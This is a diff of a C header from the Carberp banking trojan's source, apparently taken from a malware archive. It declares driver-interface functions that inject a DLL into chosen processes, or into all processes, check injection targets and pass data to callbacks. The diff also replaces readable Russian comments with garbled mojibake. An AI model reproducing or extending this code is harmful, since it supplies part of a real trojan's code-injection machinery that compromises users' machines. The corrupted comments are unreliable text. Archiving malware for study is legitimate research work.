@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef __Driver_Connect___
 #define __Driver_Connect___
 
@@ -10,9 +21,9 @@
 
 
 typedef struct __USER_INIT_NOTIFY{
-	PVOID pInfoNotifyArea;				//	указатель куда нуно писать данные драйверу
-	ULONG AreaSize;						//	 размер области
-	HANDLE hQueryEvent;					// евент для обращения к драйверу
+	PVOID pInfoNotifyArea;				//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	ULONG AreaSize;						//	 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	HANDLE hQueryEvent;					// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 }USER_INIT_NOTIFY,*PUSER_INIT_NOTIFY;
 
 typedef struct __BUFFER_DATA
@@ -24,40 +35,40 @@ typedef struct __BUFFER_DATA
 typedef VOID(WINAPI * TGlobalCallBack) (PVOID Reserved,PBUFFER_DATA Data,PVOID lParam);
 
 //
-//	puin			- значение переданное в процедуру Notify 
-//	Module			- указатель длл в памяти
-//  TargetProcess	- имя процесса в который нужно внедрить, если NULL то во все процессы.
-//  size			- размер длл в памяти
-//  Flags			- зарезервировано
+//	puin			- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Notify 
+//	Module			- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  TargetProcess	- пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ NULL пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//  size			- пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  Flags			- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetProcess,ULONG size,ULONG Flags);
 
 
 
 //
-//  Убирает запрещает инжект в процесс
-//	ProcessName	-	имя процесса
-//	возвращает TRUE если все хорошо.
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	ProcessName	-	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName);
 
 //
-//	регистрирует GlobalCallback
-//	ThreadId - поток в котором будет вызывать CallBack процедура	
-//	CallBack - CallBack процедура
-//	lParam	 -	дополнительный параметр, передается в CallBack
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GlobalCallback
+//	ThreadId - пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CallBack пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ	
+//	CallBack - CallBack пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	lParam	 -	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ CallBack
 BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGlobalCallBack CallBack,LPVOID lParam);
 
 
 //
-//	Посылает данные в GlobalCallBack
-//	Memory			-	Указатель на данные
-//	SizeMemory		-	Размер памяти
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ GlobalCallBack
+//	Memory			-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//	SizeMemory		-	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 BOOL DriverSendDataToGlobalCallBack(PUSER_INIT_NOTIFY puin, PVOID Memory, ULONG SizeMemory);
 
 
 //
-//	Проверяет будет ли инжектится в указанный процесс, какая либо длл
-//	uProcessName	-	имя процесса
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//	uProcessName	-	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
 BOOL CheckIsInjectToProcess(PUSER_INIT_NOTIFY puin, PWCHAR uProcessName);
 
